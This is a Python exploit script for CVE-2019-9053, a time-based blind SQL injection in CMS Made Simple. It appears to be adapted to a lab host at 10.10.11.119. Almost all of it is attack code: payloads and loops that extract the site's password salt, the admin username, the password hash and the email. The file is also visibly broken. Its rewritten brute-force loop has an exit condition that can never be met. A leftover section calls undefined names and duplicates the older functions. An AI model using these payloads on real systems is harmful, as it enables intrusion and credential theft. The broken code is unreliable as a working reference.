#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import hashlib, requests, string, time
from termcolor import colored, cprint

#==============================================================================

PROXIES = {'http': 'http://127.0.0.1:8080'}

#========================================================================= sqli

SLEEP            = 2
DICTIONARY       = string.digits + string.ascii_lowercase + string.ascii_uppercase + '@._-$'
PAYLOAD_SALT     = 'a,b,1,5))+and+(select+sleep({})+from+cms_siteprefs+where+sitepref_value+like+0x{}25+and+sitepref_name+like+0x736974656d61736b)+--+-'
PAYLOAD_USERNAME = 'a,b,1,5))+and+(select+sleep({})+from+cms_users+where+username+like+0x{}25+and+user_id+like+0x31)+--+-'
PAYLOAD_PASSWORD = 'a,b,1,5))+and+(select+sleep({})+from+cms_users+where+password+like+0x{}25+and+user_id+like+0x31)+--+'
PAYLOAD_EMAIL    = 'a,b,1,5))+and+(select+sleep({})+from+cms_users+where+email+like+0x{}25+and+user_id+like+0x31)+--+-'

#======================================================================= target

URL1 = 'http://10.10.11.119/admin_cms_panel/admin/moduleinterface.php?mact=News,m1_,defaultadmin,0&__c=a6434d88e6be23c41f4&m1_idlist={}'
URL2 = 'http://10.10.11.119/admin_cms_panel/admin/moduleinterface.php?mact=News,m1_,defaultadmin,0&__c=a6434d88e6be23c41f4&m1_category=&m1_sortby={}+--+-'
URL3 = 'http://10.10.11.119/admin_cms_panel/admin/moduleinterface.php?mact=News,m1_,default,0&__c=a6434d88e6be23c41f4&m1_idlist={}'

#====================================================================== exploit

SESSION = requests.session()

def bruteforce(url: str, payload: str) -> str:
    __current = ''
    while True:
        for i, c in enumerate(DICTIONARY):
            print('Trying {}'.format(bytes.fromhex(__current).decode() + c), end='\r')
            __r = SESSION.get(
                url.format(payload.format(SLEEP, __current + hex(ord(c)))),
                proxies=PROXIES)
            if __r.elapsed.total_seconds() >= SLEEP:
                __current += hex(ord(c))
        if i >= len(DICTIONARY):
            break

    return __current

salt = bruteforce(URL1, PAYLOAD_SALT)
print('[+] Salt for password found: ' + bytes.fromhex(salt).decode())

#======================================================================== trash

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
flag = True
password = ""
temp_password = ""
TIME = 2
db_name = ""
output = ""
email = ""

salt = ''

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(DICTIONARY)):
            temp_salt = salt + DICTIONARY[i]
            ord_salt_temp = ord_salt + hex(ord(DICTIONARY[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = SESSION.get(url, proxies=PROXIES)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(DICTIONARY)):
            temp_password = password + DICTIONARY[i]
            ord_password_temp = ord_password + hex(ord(DICTIONARY[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = SESSION.get(url, proxies=PROXIES)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(DICTIONARY)):
            temp_db_name = db_name + DICTIONARY[i]
            ord_db_name_temp = ord_db_name + hex(ord(DICTIONARY[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = SESSION.get(url, proxies=PROXIES)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(DICTIONARY)):
            temp_email = email + DICTIONARY[i]
            ord_email_temp = ord_email + hex(ord(DICTIONARY[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = SESSION.get(url, proxies=PROXIES)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

